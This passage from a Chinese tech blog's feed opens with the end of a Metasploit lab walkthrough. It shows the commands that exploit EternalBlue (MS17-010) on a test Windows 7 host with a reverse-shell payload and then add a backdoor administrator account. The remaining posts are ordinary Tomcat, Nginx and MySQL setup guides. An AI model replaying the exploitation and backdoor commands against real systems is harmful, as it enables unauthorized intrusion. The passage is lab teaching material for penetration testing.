id="漏洞探测及利用"><a href="#漏洞探测及利用" class="headerlink" title="漏洞探测及利用"></a>漏洞探测及利用</h2><h3 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h3><p>在上述信息收集中，我们发现445端口开启，代表着目标靶机运行者SMB服务，这给我们提供了下一步分析了利用的方向。本节内容主要围绕永恒之蓝漏洞展开，因此使用命令search ms17_010查询与永恒之蓝相关的可利用模块，发现公有4个模块，辅助模块和利用模块各两个。<br><img src="/MSF%E6%A1%86%E6%9E%B6/4.png"><br>端口开启不代表就存在永恒之蓝漏洞，因此我们还需要借助更具体的扫描模块来检验是否存在永恒之蓝漏洞，使用命令use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010进入永恒之蓝漏洞扫描模块，输入参数options查看所需参数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; options</span><br></pre></td></tr></table></figure><p><img src="/MSF%E6%A1%86%E6%9E%B6/5.png"><br>在参数查询结果中，可以看到必填项中有RHOSTS还未设置信息，使用set命令设置参数后使用run命令运行该模块。在运行结果的第一行中，Host is likely VULNERABLE to MS17-010!表示主机可能会受到ms17-010漏洞的伤害，也就是存在该漏洞。<br><img src="/MSF%E6%A1%86%E6%9E%B6/6.png"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>到此，我们从发现445端口开启，到验证永恒之蓝漏洞的存在，下一步就是漏洞利用，在前面我们已经搜索到永恒之蓝的两个漏洞利用模块，此处使用第一个进行测试。使用命令use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue进入该模块，并输入命令options查看所需参数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; options</span><br></pre></td></tr></table></figure><p><img src="/MSF%E6%A1%86%E6%9E%B6/7.png"><br>在参数查询结果中，可以看到必填项中有RHOSTS还未设置信息，使用set命令设置参数后使用run命令运行该模块。可以看到漏洞已经利用成功，接下去就可以设置用户及其他留后门的手段了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 192.168.200.129</span><br><span class="line">rhosts =&gt; 192.168.200.129</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br></pre></td></tr></table></figure><p><img src="/MSF%E6%A1%86%E6%9E%B6/8.png"><br>GetShell。输入命令shell来让靶机反弹shell到当前窗口。GetShell成功。<br><img src="/MSF%E6%A1%86%E6%9E%B6/9.png"><br>创建用户并提权为管理员。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\system32&gt;net user yjs21322 yjs21322 /add</span><br><span class="line">C:\Windows\system32&gt;net localgroup /add administrators yjs21322</span><br></pre></td></tr></table></figure><p><img src="/MSF%E6%A1%86%E6%9E%B6/10.png"><br>验证：在win7的终端，输入net user查询用户列表，可以看到yjs21322用户已经在其中。<br><img src="/MSF%E6%A1%86%E6%9E%B6/11.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;MSF简介&quot;&gt;&lt;a href=&quot;#MSF简介&quot; class=&quot;headerlink&quot; title=&quot;MSF简介&quot;&gt;&lt;/a&gt;MSF简介&lt;/h2&gt;&lt;p&gt;Metasploit框架（Metasploit Framework, MSF）是一个开源工具，旨在方便渗透测试，它是</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://jielunya.github.io/tags/CTF/"/>
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>搭建三个Tomcat，并实现负载均衡</title>
    <link href="https://jielunya.github.io/2022/12/12/%E6%90%AD%E5%BB%BA%E4%B8%89%E4%B8%AATomcat%EF%BC%8C%E5%B9%B6%E5%AE%9E%E7%8E%B0%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"/>
    <id>https://jielunya.github.io/2022/12/12/%E6%90%AD%E5%BB%BA%E4%B8%89%E4%B8%AATomcat%EF%BC%8C%E5%B9%B6%E5%AE%9E%E7%8E%B0%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/</id>
    <published>2022-12-12T12:28:03.000Z</published>
    <updated>2022-12-12T13:21:33.156Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装vim和net-tools"><a href="#安装vim和net-tools" class="headerlink" title="安装vim和net-tools"></a>安装vim和net-tools</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install vim -y</span><br><span class="line">yum install net-tools -y</span><br></pre></td></tr></table></figure><h2 id="安装JDK环境"><a href="#安装JDK环境" class="headerlink" title="安装JDK环境"></a>安装JDK环境</h2><blockquote>将预先下载好jdk解压，并更名为jdk，移动到/usr/local/目录下</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zxf jdk-8u161-linux-x64.tar.gz</span><br><span class="line">mv  jdk1.8.0_161/ jdk</span><br><span class="line">mv jdk /usr/local</span><br><span class="line">vim /etc/profile</span><br></pre></td></tr></table></figure><blockquote>写入如下内容:</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JAVA_HOME=/usr/local/jdk</span><br><span class="line">PATH=$JAVA_HOME/bin:$PATH</span><br><span class="line">CLASSPATH=$JAVA_HOME/jre/lib/txt:$JAVA_HOME/lib/tools.jar </span><br><span class="line">export JAVA_HOME PATH CLASSPATH </span><br></pre></td></tr></table></figure><blockquote>使配置文件生效</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure><blockquote>java -version #查看是否安装成功</blockquote><h2 id="安装Tomcat"><a href="#安装Tomcat" class="headerlink" title="安装Tomcat"></a>安装Tomcat</h2><blockquote>将预先下载好的tomcat包解压，并更名为tomcat，移动到/usr/local/目录下,并复制另外两个Tomcat出来</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zxf apache-tomcat-8.5.84.tar.gz</span><br><span class="line">mv apache-tomcat-8.5.84 tomcat</span><br><span class="line">mv tomcat /usr/local</span><br><span class="line">cd /usr/local</span><br><span class="line">cp -r tomcat tomcat1</span><br><span class="line">cp -r tomcat tomcat2</span><br></pre></td></tr></table></figure><h2 id="更改Tomcat配置server-xml中的端口号"><a href="#更改Tomcat配置server-xml中的端口号" class="headerlink" title="更改Tomcat配置server.xml中的端口号"></a>更改Tomcat配置server.xml中的端口号</h2><blockquote>方法一：sed -i 就是直接对文本文件进行操作的 sed -i 's/原字符串/新字符串/g' 对应路径，其中s为替换，g为全局。方法二：命令行模式输入，:%s/源字符串/目的字符串/g这里采用第一种</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sed -i &#x27;s#8080#8081#g&#x27; /usr/local/tomcat1/conf/server.xml </span><br><span class="line">sed -i &#x27;s#8005#8006#g&#x27; /usr/local/tomcat1/conf/server.xml </span><br><span class="line">sed -i &#x27;s#8009#8010#g&#x27; /usr/local/tomcat1/conf/server.xml </span><br><span class="line">sed -i &#x27;s#8080#8082#g&#x27; /usr/local/tomcat2/conf/server.xml </span><br><span class="line">sed -i &#x27;s#8005#8007#g&#x27; /usr/local/tomcat2/conf/server.xml </span><br><span class="line">sed -i &#x27;s#8009#8011#g&#x27; /usr/local/tomcat2/conf/server.xml</span><br></pre></td></tr></table></figure><h2 id="放开端口-或者关闭防火墙"><a href="#放开端口-或者关闭防火墙" class="headerlink" title="放开端口,或者关闭防火墙"></a>放开端口,或者关闭防火墙</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=8080/tcp --permanent</span><br><span class="line">firewall-cmd --zone=public --add-port=8081/tcp -permanent</span><br><span class="line">firewall-cmd --zone=public --add-port=8082/tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld</span><br></pre></td></tr></table></figure><h2 id="启动三个Tomcat并在网页上验证"><a href="#启动三个Tomcat并在网页上验证" class="headerlink" title="启动三个Tomcat并在网页上验证"></a>启动三个Tomcat并在网页上验证</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/local/tomcat/bin/</span><br><span class="line">./startup.sh</span><br><span class="line">cd /usr/local/tomcat1/bin/</span><br><span class="line">./startup.sh</span><br><span class="line">cd /usr/local/tomcat2/bin/</span><br><span class="line">./startup.sh</span><br></pre></td></tr></table></figure><h2 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h2><blockquote>为了方便直接使用脚本安装</blockquote><blockquote>Nginx安装包nginx-1.12.2.tar.gz放在/opt里面</blockquote><blockquote>编写并执行脚本nginx_install.sh，脚本位置随意,如下为脚本内容</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">#======编译安装nginx服务======</span><br><span class="line">#安装所需开发包和编译环境、编译器</span><br><span class="line">yum -y install pcre-devel zlib-devel openssl-devel gcc gcc-c++ make</span><br><span class="line">#创建程序用户，便于准确控制访问</span><br><span class="line">useradd -M -s /sbin/nologin nginx</span><br><span class="line"></span><br><span class="line">#解压安装包</span><br><span class="line">cd /opt</span><br><span class="line">tar zxvf nginx-1.12.2.tar.gz -C /opt/</span><br><span class="line"></span><br><span class="line">#指定安装路径、指定用户名、组名、启用模块以支持统计状态</span><br><span class="line">cd nginx-1.12.2/</span><br><span class="line">./configure --prefix=/usr/local/nginx --user=nginx --group=nginx --with-http_stub_status_module --with-file-aio --with-http_gzip_static_module --with-http_flv_module --with-http_ssl_module</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#编译及安装</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">#软链接便于系统识别nginx操作命令</span><br><span class="line">ln -s /usr/local/nginx/sbin/nginx /usr/local/sbin/</span><br><span class="line"></span><br><span class="line">#添加nginx系统服务</span><br><span class="line">echo &#x27;[Unit]</span><br><span class="line">Description=nginx</span><br><span class="line">After=network.target</span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">PIDFile=/usr/local/nginx/logs/nginx.pid</span><br><span class="line">ExecStart=/usr/local/nginx/sbin/nginx</span><br><span class="line">ExecrReload=/bin/kill -s HUP $MAINPID</span><br><span class="line">ExecrStop=/bin/kill -s QUIT $MAINPID</span><br><span class="line">PrivateTmp=true</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target&#x27; &gt; /lib/systemd/system/nginx.service</span><br><span class="line"></span><br><span class="line">#赋权及开启服务、开启开机自启</span><br><span class="line">chmod 754 /lib/systemd/system/nginx.service</span><br><span class="line">systemctl start nginx.service</span><br><span class="line">systemctl enable nginx.service</span><br></pre></td></tr></table></figure><h2 id="验证三个Tomcat是否启动成功。"><a href="#验证三个Tomcat是否启动成功。" class="headerlink" title="验证三个Tomcat是否启动成功。"></a>验证三个Tomcat是否启动成功。</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ntpl</span><br></pre></td></tr></table></figure><blockquote>如下为成功后会出现的内容<blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcp6       0      0 127.0.0.1:8005          :::*              LISTEN      35174/java          </span><br><span class="line">tcp6       0      0 127.0.0.1:8006          :::*              LISTEN      35186/java          </span><br><span class="line">tcp6       0      0 127.0.0.1:8007          :::*              LISTEN      35200/java          </span><br><span class="line">tcp6       0      0 :::8080                 :::*              LISTEN      35174/java         </span><br><span class="line">tcp6       0      0 :::8081                 :::*              LISTEN      35186/java          </span><br><span class="line">tcp6       0      0 :::8082                 :::*              LISTEN      35200/java</span><br></pre></td></tr></table></figure><h2 id="配置Nginx"><a href="#配置Nginx" class="headerlink" title="配置Nginx"></a>配置Nginx</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/local/nginx/conf</span><br><span class="line">vim nginx.conf</span><br></pre></td></tr></table></figure><blockquote>添加如下内容，没有的就添加，有的就修改</blockquote><blockquote>注意事项:upstream后的名字要与location下的proxy_pass的名字一样。比方：upstream tomcat，proxy_pass http://tomcat;</blockquote><blockquote>注意事项:server_name 为将要映射的域名</blockquote><blockquote>注意事项:upstream下的server接三个相同的ip地址，接三个不同的端口，weight=1为权重，服务每收到3个客户端的请求，会把其中的1个转发给后端a，把其中的1个转发给后端b，把其中的1个转发给后端c，实现负载均衡。max_fails=3,fail_timeout=10s，意思是在10秒内请求某一应用失败3次，认为该应用宕机，然后等待10秒，这段时间内不会再把新请求发送到已经宕机的应用，而是直接发到正常的服务器，时间到后再有请求进来继续尝试连接宕机应用且仅尝试1次，如果还是失败，则继续等待10秒以此循环，直到恢复</blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">worker_processes  1;</span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line">    sendfile        on;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line">    #gzip  on;</span><br><span class="line">    upstream tomcat &#123;</span><br><span class="line">    server 192.168.200.132:8080     weight=1    max_fails=3    fail_timeout=10s;</span><br><span class="line">    server 192.168.200.132:8081     weight=1    max_fails=3    fail_timeout=10s;</span><br><span class="line">    server 192.168.200.132:8082     weight=1    max_fails=3    fail_timeout=10s;</span><br><span class="line">&#125;</span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  www.yjs21322.com;</span><br><span class="line"></span><br><span class="line">        #charset koi8-r;</span><br><span class="line"></span><br><span class="line">        #access_log  logs/host.access.log  main;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            root   html;</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">            proxy_pass http://tomcat;</span><br><span class="line">        &#125;</span><br><span class="line">        #error_page  404              /404.html;</span><br><span class="line"></span><br><span class="line">        # redirect server error pages to the static page /50x.html</span><br><span class="line">        #</span><br><span class="line">        error_page   500 502 503 504  /50x.html;</span><br><span class="line">        location = /50x.html &#123;</span><br><span class="line">            root   html;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nginx -t 检查Nginx配置文件语法，出现successful即为成功</span><br><span class="line">systemctl restart nginx 重启Nginx</span><br></pre></td></tr></table></figure><blockquote>创建每个Tomcat的网站目录，在Tomcat目录下，创建名为app1的文件夹，三个Tomcat都是，然后用echo直接创建并编写index.jsp的内容。</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/local/tomcat/webapps/</span><br><span class="line">mkdir app1</span><br><span class="line">echo &#x27;&lt;%out.println(&quot;This is tomcat-1 yjs&quot;); %&gt;&#x27; &gt;  /usr/local/tomcat/webapps/app1/index.jsp</span><br><span class="line"></span><br><span class="line">cd /usr/local/tomcat1/webapps/</span><br><span class="line">mkdir app1</span><br><span class="line">echo &#x27;&lt;%out.println(&quot;This is tomcat-2 213&quot;); %&gt;&#x27; &gt;  /usr/local/tomcat1/webapps/app1/index.jsp</span><br><span class="line"></span><br><span class="line">cd /usr/local/tomcat2/webapps/</span><br><span class="line">mkdir app1</span><br><span class="line">echo &#x27; &lt;%out.println(&quot;This is tomcat-3 潘杰伦&quot;); %&gt;&#x27; &gt;  /usr/local/tomcat2/webapps/app1/index.jsp</span><br></pre></td></tr></table></figure><h2 id="映射域名并验证"><a href="#映射域名并验证" class="headerlink" title="映射域名并验证"></a>映射域名并验证</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在物理机C:\Windows\System32\drivers\etc目录改hosts文件</span><br><span class="line">映射192.168.200.132 www.yjs21322.com</span><br><span class="line">访问www.yjs21322.com/app1/</span><br><span class="line">即可看到轮询,验证了Tomcat的负载均衡</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;安装vim和net-tools&quot;&gt;&lt;a href=&quot;#安装vim和net-tools&quot; class=&quot;headerlink&quot; title=&quot;安装vim和net-tools&quot;&gt;&lt;/a&gt;安装vim和net-tools&lt;/h2&gt;&lt;figure class=&quot;highli</summary>
      
    
    
    
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>基于域名的虚拟主机的配置-nginx</title>
    <link href="https://jielunya.github.io/2022/12/12/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%90%8D%E7%9A%84%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E7%9A%84%E9%85%8D%E7%BD%AE-nginx/"/>
    <id>https://jielunya.github.io/2022/12/12/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%90%8D%E7%9A%84%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E7%9A%84%E9%85%8D%E7%BD%AE-nginx/</id>
    <published>2022-12-12T12:06:03.000Z</published>
    <updated>2022-12-12T12:27:03.233Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install nginx -y</span><br></pre></td></tr></table></figure><h2 id="进入已配置好的网站根目录-创建两个测试文件夹"><a href="#进入已配置好的网站根目录-创建两个测试文件夹" class="headerlink" title="进入已配置好的网站根目录,创建两个测试文件夹"></a>进入已配置好的网站根目录,创建两个测试文件夹</h2><blockquote>文件夹中用于存放测试网站信息，即存放项目代码。</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/share/nginx/html</span><br><span class="line">mkdir Testpage-1</span><br><span class="line">mkdir Testpage-2</span><br></pre></td></tr></table></figure><h2 id="创建并编辑index-html文件"><a href="#创建并编辑index-html文件" class="headerlink" title="创建并编辑index.html文件"></a>创建并编辑index.html文件</h2><blockquote>index.html为将要显示的页面，同样可以把网站项目直接放在/usr/share/nginx/html/目录下，直接使用</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/share/nginx/html/Testpage-1/</span><br><span class="line">vim index.html</span><br><span class="line">按i进入编辑模式，输入以下测试内容。</span><br><span class="line">Test page 1</span><br><span class="line">:wq!保存</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/share/nginx/html/Testpage-2/</span><br><span class="line">vim index.html</span><br><span class="line">按i进入编辑模式，输入以下测试内容。</span><br><span class="line">Test page 2</span><br><span class="line">:wq!保存</span><br></pre></td></tr></table></figure><h2 id="配置Nginx"><a href="#配置Nginx" class="headerlink" title="配置Nginx"></a>配置Nginx</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">运行以下命令查看nginx.conf配置文件。</span><br><span class="line">cat /etc/nginx/nginx.conf</span><br><span class="line">其中include /etc/nginx/conf.d/*.conf;表示Nginx将会从该路径下的所有.conf文件获取站点信息。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">为测试站点Testpage-1创建并配置Nginx配置文件。</span><br><span class="line">运行以下命令进入/etc/nginx/conf.d路径下</span><br><span class="line">cd /etc/nginx/conf.d</span><br><span class="line">为试站点Testpage-1创建并配置Nginx配置文件。</span><br><span class="line">vim Testpage1.conf</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">按i进入编辑模式，输入以下内容。</span><br><span class="line">在注释内容处，替换服务器域名参数信息与项目路径参数信息。</span><br><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  testpage1.com;    #此处使用测试域名。实际配置中使用您的服务器域名。</span><br><span class="line"></span><br><span class="line">    #charset koi8-r;</span><br><span class="line">    access_log  /var/log/nginx/b.access.log  main;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        root   /usr/share/nginx/html/Testpage-1;    #测试站点路径。即您的项目代码路径。</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    #error_page  404              /404.html;</span><br><span class="line"></span><br><span class="line">    error_page   500 502 503 504  /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        root   /usr/share/nginx/html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">为测试站点Testpage-2创建并配置Nginx配置文件。</span><br><span class="line">运行以下命令进入/etc/nginx/conf.d路径下</span><br><span class="line">cd /etc/nginx/conf.d</span><br><span class="line">为试站点Testpage-1创建并配置Nginx配置文件。</span><br><span class="line">vim Testpage2.conf</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b.按i进入编辑模式，输入以下内容。</span><br><span class="line">在注释内容处，替换服务器域名参数信息与项目路径参数信息。</span><br><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  testpage2.com;    #此处使用测试域名。实际配置中使用您的服务器域名。</span><br><span class="line"></span><br><span class="line">    #charset koi8-r;</span><br><span class="line">    access_log  /var/log/nginx/b.access.log  main;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        root   /usr/share/nginx/html/Testpage-2;    #测试站点路径。即您的项目代码路径。</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    #error_page  404              /404.html;</span><br><span class="line"></span><br><span class="line">    error_page   500 502 503 504  /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        root   /usr/share/nginx/html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="重启Nginx服务"><a href="#重启Nginx服务" class="headerlink" title="重启Nginx服务"></a>重启Nginx服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure><h2 id="本地配置hosts-配置了，可以以域名方式访问"><a href="#本地配置hosts-配置了，可以以域名方式访问" class="headerlink" title="本地配置hosts(配置了，可以以域名方式访问)"></a>本地配置hosts(配置了，可以以域名方式访问)</h2><blockquote>1.访问C:\Windows\System32\drivers\etc目录。2.复制hosts文件进行备份。保留hosts - 副本文件，在测试完成后使用该文件恢复hosts文件的初始状态。3.修改hosts文件。在文件末尾追加以下内容。IP地址 testpage1.comIP地址 testpage2.com保存文件并退出。4.返回Windows桌面，并按下Win + R组合键。5.在运行对话框中输入cmd，并单击确定。6.在命令行中运行以下命令，使hosts配置立即生效。ipconfig /flushdns在本地主机打开浏览器，成功访问到两个测试站点。</blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;安装Nginx&quot;&gt;&lt;a href=&quot;#安装Nginx&quot; class=&quot;headerlink&quot; title=&quot;安装Nginx&quot;&gt;&lt;/a&gt;安装Nginx&lt;/h2&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cl</summary>
      
    
    
    
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>搭建Nginx服务</title>
    <link href="https://jielunya.github.io/2022/12/12/%E6%90%AD%E5%BB%BAnginx/"/>
    <id>https://jielunya.github.io/2022/12/12/%E6%90%AD%E5%BB%BAnginx/</id>
    <published>2022-12-12T11:57:03.000Z</published>
    <updated>2022-12-12T12:05:27.626Z</updated>
    
    <content type="html"><![CDATA[<h2 id="yum安装nginx"><a href="#yum安装nginx" class="headerlink" title="yum安装nginx"></a>yum安装nginx</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install nginx -y</span><br></pre></td></tr></table></figure><h2 id="查看nginx版本"><a href="#查看nginx版本" class="headerlink" title="查看nginx版本"></a>查看nginx版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nginx -version</span><br></pre></td></tr></table></figure><h2 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld</span><br></pre></td></tr></table></figure><h2 id="修改Nginx默认页面内容，浏览器访问ip"><a href="#修改Nginx默认页面内容，浏览器访问ip" class="headerlink" title="修改Nginx默认页面内容，浏览器访问ip"></a>修改Nginx默认页面内容，浏览器访问ip</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /usr/share/nginx/html/index.html</span><br></pre></td></tr></table></figure><blockquote>可以添加修改<h1>Welcome to nginx!</h1>的内容，比如将Welcome to nginx!改为yjs213-22</blockquote><blockquote>也可以将index.html内容全部删除，直接添加自己想要的文字</blockquote><blockquote>也可以将网站源代码直接拉到/usr/share/nginx/html目录下，访问即可拥有做好的网站项目</blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;yum安装nginx&quot;&gt;&lt;a href=&quot;#yum安装nginx&quot; class=&quot;headerlink&quot; title=&quot;yum安装nginx&quot;&gt;&lt;/a&gt;yum安装nginx&lt;/h2&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;tabl</summary>
      
    
    
    
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>搭建并配置Mysql服务</title>
    <link href="https://jielunya.github.io/2022/12/11/%E6%90%AD%E5%BB%BA%E5%B9%B6%E9%85%8D%E7%BD%AEMysql%E6%9C%8D%E5%8A%A1/"/>
    <id>https://jielunya.github.io/2022/12/11/%E6%90%AD%E5%BB%BA%E5%B9%B6%E9%85%8D%E7%BD%AEMysql%E6%9C%8D%E5%8A%A1/</id>
    <published>2022-12-11T15:04:03.000Z</published>
    <updated>2022-12-12T11:56:18.664Z</updated>
    
    <content type="html"><![CDATA[<h2 id="检查是否已经安装Mysql，如未安装则执行下面命令为空。"><a href="#检查是否已经安装Mysql，如未安装则执行下面命令为空。" class="headerlink" title="检查是否已经安装Mysql，如未安装则执行下面命令为空。"></a>检查是否已经安装Mysql，如未安装则执行下面命令为空。</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -qa |grep -i mysql</span><br></pre></td></tr></table></figure><h3 id="如果不为空，则使用以下命令，进行删除安装过的包，删除相关服务，找出残余文件并删除。"><a href="#如果不为空，则使用以下命令，进行删除安装过的包，删除相关服务，找出残余文件并删除。" class="headerlink" title="如果不为空，则使用以下命令，进行删除安装过的包，删除相关服务，找出残余文件并删除。"></a>如果不为空，则使用以下命令，进行删除安装过的包，删除相关服务，找出残余文件并删除。</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -e 对应文件名</span><br><span class="line">chkconfig --list | grep -i mysql</span><br><span class="line">chkconfig --del mysql</span><br><span class="line">find / -name mysql</span><br><span class="line">rm -rf 对应文件路径</span><br></pre></td></tr></table></figure><h2 id="可能系统自带了Mariadb数据库，要先卸载。"><a href="#可能系统自带了Mariadb数据库，要先卸载。" class="headerlink" title="可能系统自带了Mariadb数据库，要先卸载。"></a>可能系统自带了Mariadb数据库，要先卸载。</h2><p>查询是否自带Mariadb数据库。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -qa |grep Mariadb</span><br></pre></td></tr></table></figure><blockquote>有的话执行rpm -e --nodeps 对应软件包名字</blockquote><blockquote>我这里是rpm -e --nodeps mariadb-libs-5.5.56-2.el7.x86_64</blockquote><h2 id="下载Mysql源到服务器（一般可从这里开始，以上可忽略。）"><a href="#下载Mysql源到服务器（一般可从这里开始，以上可忽略。）" class="headerlink" title="下载Mysql源到服务器（一般可从这里开始，以上可忽略。）"></a>下载Mysql源到服务器（一般可从这里开始，以上可忽略。）</h2><blockquote>Mysql源地址：https://repo.mysql.com</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://repo.mysql.com//mysql80-community-release-el7-3.noarch.rpm</span><br></pre></td></tr></table></figure><p>此处地址是由<a href="https://repo.mysql.com/">https://repo.mysql.com</a> 加上&#x2F;&#x2F;再接上对应rpm文件名得出。</p><h2 id="安装Mysql的yum源"><a href="#安装Mysql的yum源" class="headerlink" title="安装Mysql的yum源"></a>安装Mysql的yum源</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -ivh mysql80-community-release-el7-3.noarch.rpm</span><br></pre></td></tr></table></figure><blockquote>执行yum makecache可查看到已安装的yum源</blockquote><h2 id="安装Mysql"><a href="#安装Mysql" class="headerlink" title="安装Mysql"></a>安装Mysql</h2><blockquote>这里的nogpgcheck是跳过检查公钥安装，否则可能安装不了。</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install mysql-community-server --nogpgcheck -y</span><br></pre></td></tr></table></figure><h2 id="查看版本号，启动Mysql设置开机启动并查看状态"><a href="#查看版本号，启动Mysql设置开机启动并查看状态" class="headerlink" title="查看版本号，启动Mysql设置开机启动并查看状态"></a>查看版本号，启动Mysql设置开机启动并查看状态</h2><figure class="highlight plaintext"><table><tr><td 